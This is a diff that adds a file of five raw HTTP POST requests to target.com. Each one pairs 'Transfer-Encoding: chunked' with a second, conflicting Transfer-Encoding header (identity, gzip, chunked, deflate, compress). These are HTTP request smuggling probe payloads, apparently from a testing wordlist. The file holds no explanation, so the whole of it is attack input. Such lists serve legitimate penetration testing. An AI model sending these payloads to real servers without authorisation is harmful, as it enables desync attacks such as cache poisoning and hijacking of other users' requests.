@@ -1,0 +1,34 @@
+POST / HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+Transfer-Encoding: identity
+
+0
+
+POST / HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+Transfer-Encoding: gzip
+
+0
+
+POST / HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+Transfer-Encoding: deflate
+
+0
+
+POST / HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+Transfer-Encoding: compress
+
+0
